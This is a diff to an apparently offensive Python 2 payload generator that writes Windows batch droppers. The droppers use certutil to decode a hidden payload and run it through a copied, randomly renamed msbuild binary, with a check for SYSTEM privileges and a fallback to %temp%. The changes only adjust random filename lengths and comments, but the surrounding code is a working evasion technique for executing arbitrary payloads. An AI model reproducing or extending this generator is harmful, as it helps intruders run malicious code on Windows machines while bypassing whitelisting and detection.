@@ -1,6 +1,5 @@
 #!/usr/bin/env python2
 # Author: Mr.Un1k0d3r - RingZer0 Team 2017
-# cmd file enhancements by blark
 
 from __future__ import print_function
 import random
@@ -96,12 +95,13 @@ class Generator:
 
         def gen_final_cmd(self, path):
                 filepath = []
-                filepath.append(self.gen_str(random.randrange(5, 25)))
-                filepath.append(self.gen_str(random.randrange(5, 25)))
-                filepath.append(self.gen_str(random.randrange(5, 25)))
+                filepath.append(self.gen_str(random.randrange(8, 18)))
+                filepath.append(self.gen_str(random.randrange(8, 18)))
+                filepath.append(self.gen_str(random.randrange(8, 18)))
 
                 # if user is SYSTEM then use the msbuild path and perform msbuild copy
                 # otherwise work out of %temp% and don't copy the binary
+                # finally, if the decoded file already exists, just run it
                 payload = ("@ECHO OFF\n"
                            "set p=\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\\n"
                            "copy /Y NUL %p%\\{2} > NUL 2>&1 && set SYSTEM=1\n"
@@ -123,7 +123,7 @@ class Generator:
                         msbuild = self.gen_process()
                 else:
                         msbuild = self.gen_str(random.randrange(5, 25)) + ".exe"
-                # decode paylod, copy msbuild, launch payload with copied msbuild
+                # decode paylod, copy msbuild, launch payload
                 payload += ("\ncertutil -decodehex %f0% %f1%\n"
                             "IF %SYSTEM%==1 (copy %p%\\msbuild.exe %p%\\{0})\n"
                             ":RUN\n"
